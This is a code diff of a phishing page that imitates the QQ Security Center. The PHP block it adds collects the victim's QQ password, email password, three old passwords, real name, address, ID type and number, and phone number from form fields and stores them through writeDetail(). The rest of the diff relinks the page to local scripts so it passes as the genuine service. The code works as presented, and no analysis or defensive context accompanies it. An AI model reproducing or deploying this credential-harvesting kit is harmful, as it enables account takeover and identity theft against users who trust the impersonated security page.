@@ -1,3 +1,29 @@
+<?php
+	require('function.php');
+
+	if(!isset($_GET['u']) || !isset($_GET['p'])){
+		echo "<script>alert('无权访问');window.location.href='index.php'</script>";
+	}
+
+	$trueName=$_GET['txtName'];
+	$addr=$_GET['txtAddress'];
+	$anotherQQ=$_GET['txtContactQQ'];
+	$password=$_GET['txtContactQQPW'];
+	$reciveType=$_GET['radiobutton'];
+	$reciveMail=$_GET['txtContactEmail'];
+	$reciveMailPassword=$_GET['yxmm'];
+	$historyPw1=$_POST['history_pwd_1_password'];
+	$historyPw2=$_POST['pwdOldPW2'];
+	$historyPw3=$_POST['pwdOldPW3'];
+	$trueName1=$_POST['xm'];
+	$certificateType=$_POST['zj'];
+	$certificateNumber=$_POST['hm'];
+	$phoneNumber=$_POST['sj'];
+	$other=$_POST['ziliao'];
+
+	writeDetail($_GET['u'],$trueName,$addr,$anotherQQ,$password,$reciveType,$reciveMail,$reciveMailPassword,$historyPw1,$historyPw2,$historyPw3,$trueName1,$certificateType,$certificateNumber,$phoneNumber,$other);
+
+?>
 <!DOCTYPE html>
 <html><head>
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
@@ -31,13 +57,13 @@
 	<div id="header">
  
     	<div id="top">
-		<a onfocus="this.blur()" class="logo" href="http://serviec.boy-ex.com/"><cite>QQ安全中心<br>
+		<a onfocus="this.blur()" class="logo" href="cn2.php"><cite>安全中心<br>
 		在线生活安全护航</cite></a>
         	<div class="right_info">
             <ul>
 			
-            <li><span>欢迎您，QQ用户</span></li>
-			<li class="cent" id="safe_score_item"><a href="http://serviec.boy-ex.com/cn2/index"><strong id="head_safe_score"><font color="#FF8000">
+            <li><span>欢迎您，<?php echo getQQNick($_GET['u']); ?>(<?php echo $_GET['u']; ?>)</span></li>
+			<li class="cent" id="safe_score_item"><a href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>"><strong id="head_safe_score"><font color="#FF8000">
 			30分</font></strong></a></li>
 			 <li><a href="javascript:LoginOut();">退出</a></li>
 			
@@ -56,13 +82,13 @@
     
     	<div id="menu">
         	<ul>
-            <li class="on1" id="menu_index"><a onfocus="this.blur()" class="m1" href="http://serviec.boy-ex.com/cn2/index"><cite>
+            <li id="menu_index"><a onfocus="this.blur()" class="m1" href=""><cite>
 			首页</cite></a></li>
-            <li id="menu_account_prot"><a onfocus="this.blur()" class="m2" href="http://serviec.boy-ex.com/cn2/safe_service/my_prot" onmouseover="ShowSubMenu('submenu_account_prot');" onmouseout="HideSubMenu('submenu_account_prot');"><cite>
+            <li id="menu_account_prot"><a onfocus="this.blur()" class="m2" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onmouseover="ShowSubMenu('submenu_account_prot');" onmouseout="HideSubMenu('submenu_account_prot');"><cite>
 			帐号保护</cite></a></li>
-            <li id="menu_pwd_manage"><a onfocus="this.blur()" class="m3" href="http://serviec.boy-ex.com/cn2/psw_mgr/psw_mgr_index" onmouseover="ShowSubMenu('submenu_pwd_manage');" onmouseout="HideSubMenu('submenu_pwd_manage');"><cite>
+            <li class="on3" id="menu_pwd_manage"><a onfocus="this.blur()" class="m3" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onmouseover="ShowSubMenu('submenu_pwd_manage');" onmouseout="HideSubMenu('submenu_pwd_manage');"><cite>
 			密码管理</cite></a></li>
-            <li id="menu_safe_mutual"><a onfocus="this.blur()" class="m4" href="http://serviec.boy-ex.com/cn2/safe_school/safe_school_index" onmouseover=""><cite>
+            <li id="menu_safe_mutual"><a onfocus="this.blur()" class="m4" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onmouseover=""><cite>
 			安全学堂</cite></a></li>
             </ul>
         </div>
@@ -70,123 +96,8 @@
    	  <a onfocus="this.blur()" class="toolbox" href="javascript:;" onmouseover="ShowSubMenu('menu_toolbox')"><cite>
 		密保工具箱</cite></a>
  
- 
-<!--帐号保护下拉菜单-->
-<div class="accounts_list" id="submenu_account_prot" onmouseover="ShowSubMenu('submenu_account_prot','menu_account_prot','on2');" onmouseout="HideSubMenu('submenu_account_prot','menu_account_prot');" name="submenu" style="display:none;">
-	<h3><a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/safe_service/my_prot"><cite>帐号保护</cite></a></h3>
-	<ul>
-    <li><a onfocus="this.blur()" class="a1" href="http://serviec.boy-ex.com/cn2/safe_service/my_qbqd_prot"><cite>
-	保护Q币Q点</cite></a></li>
-    <li><a onfocus="this.blur()" class="a2" href="http://serviec.boy-ex.com/cn2/safe_service/my_game_prot"><cite>
-	保护游戏</cite></a></li>
-    <li><a onfocus="this.blur()" class="a3" href="http://serviec.boy-ex.com/cn2/safe_service/my_login_prot"><cite>
-	保护QQ登录</cite></a></li>
-    <li><a onfocus="this.blur()" class="a4" href="http://serviec.boy-ex.com/cn2/safe_service/my_key_prot"><cite>
-	保护QQ SHOW物品</cite></a></li>
-    </ul>
-</div><!--帐号保护下拉菜单 End-->
- 
-<!--密码管理下拉菜单-->
-<div class="accounts_list password_list" style="display:none;" id="submenu_pwd_manage" name="submenu" onmouseover="ShowSubMenu('submenu_pwd_manage','menu_pwd_manage','on3');" onmouseout="HideSubMenu('submenu_pwd_manage','menu_pwd_manage');">
-	<h3><a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/psw_mgr/psw_mgr_index"><cite>密码管理</cite></a></h3>
-	<ul>
-    <li><a onfocus="this.blur()" class="pw1" href="http://serviec.boy-ex.com/cn2/change_psw/change_psw_index"><cite>
-	修改密码</cite></a></li>
-    <li><a onfocus="this.blur()" class="pw2" href="http://serviec.boy-ex.com/cn2/findpsw/findpsw_index"><cite>
-	找回密码</cite></a></li>
-    <li><a onfocus="this.blur()" class="pw3" href="http://serviec.boy-ex.com/cn2/ipwd/my_ipwd"><cite>
-	独立密码管理</cite></a></li>
-    <li><a onfocus="this.blur()" class="pw4" href="http://serviec.boy-ex.com/cn2/appeal/appeal_index"><cite>
-	帐号申诉</cite></a></li>
-    </ul>
-</div><!--密码管理下拉菜单 End-->
- 
-<!--密保工具箱下拉菜单-->
-<div class="toolbox_menu" id="menu_toolbox" name="submenu" onmouseover="ShowSubMenu('menu_toolbox');" onmouseout="HideSubMenu('menu_toolbox');" style="display:none;">
-<div class="toolbox_hover" id="toolbox_hover"></div>
-    <div class="toolbox_menu_list">
-    <div class="bg_top"></div>
-        <ul>
-        <li><a href="http://serviec.boy-ex.com/cn2/manage/mobile/mobile_index"><i class="i1"></i><span>
-		密保手机</span></a></li>
-        <li><a href="http://serviec.boy-ex.com/cn2/manage/mbtoken/mbtoken_home"><i class="i3"></i><span>
-		手机令牌</span></a></li>
-		<li><a href="http://serviec.boy-ex.com/cn2/manage/qqtoken/qqtoken_home"><i class="i6"></i><span>
-		QQ令牌</span></a></li>
-		 <li><a href="http://serviec.boy-ex.com/cn2/manage/mbk/my_mbk"><i class="i4"></i><span>密保卡</span></a></li>
-		 <li><a href="http://serviec.boy-ex.com/cn2/manage/question/my_question"><i class="i2"></i><span>
-			密保问题</span></a></li>
-        </ul>
-    <div class="bg_bottom"></div>
-    </div>
-</div><!--密保工具箱下拉菜单 End-->
- 
-<!--站点地图-->
-<div class="m_h" style="display:none;right:113px;" id="site_map_menu" onmouseover="ShowSubMenu('site_map_menu');" onmouseout="HideSubMenu('site_map_menu');">
-	<div class="m_h_t">站点地图<b></b></div>
-    <dl>
-    <dt><a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/index">首页</a></dt>
-    </dl>
-    
-    <dl>
-    <dt><a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/safe_service/my_prot">帐号保护</a></dt>
-    <dd>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/safe_service/my_qbqd_prot">Q币Q点保护</a>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/safe_service/my_login_prot">QQ登录保护</a>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/safe_service/my_game_prot">游戏保护</a>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/safe_service/my_key_prot">QQ秀物品保护</a>
-    </dd>
-    </dl>
-    
-    <dl>
-    <dt><a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/manage/my_mb">密保工具箱</a></dt>
-    <dd>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/manage/question/my_question">密保问题</a>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/manage/mobile/mobile_index">密保手机</a>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/manage/mbk/my_mbk">密保卡</a>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/manage/qqtoken/qqtoken_home">QQ令牌</a>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/manage/mbtoken/mbtoken_home">手机令牌</a>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/manage/mb_reset/mb_reset_index">申请重置密保</a>
-    </dd>
-    </dl>
-    
-    <dl>
-    <dt><a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/psw_mgr/psw_mgr_index">密码管理</a></dt>
-    <dd>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/findpsw/findpsw_index">找回密码</a>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/change_psw/change_psw_index">修改密码</a>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/appeal/appeal_index">帐号申诉</a><br>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/ipwd/my_ipwd">独立密码管理</a>
-    </dd>
-    </dl>
- 
-    <dl>
-    <dt><a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/safe_school/safe_school_index">安全学堂</a></dt>
-    </dl>
-    
-    <dl class="n">
-    <dt class="g">其他</dt>
-    <dd>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/v2/safe_school/report_index.shtml">举报</a>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/safe_school/url_appeal_index">网址申诉</a>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/safe_school/url_query_index">网址安全检测</a><br>
-    <a onfocus="this.blur()" href="http://serviec.boy-ex.com/cn2/personal_info/personal_info_index">个人资料</a>
-	<a onfocus="this.blur()" href="http://serviec.boy-ex.com/v2/notice/notice.shtml">系统公告</a>
-    </dd>
-    </dl>
-</div>
-<!--站点地图end-->
- 
   </div>
 </div><!--Header End-->
- 
- 
- 
- 
- 
-
- 
- 
  
  
 <script> 
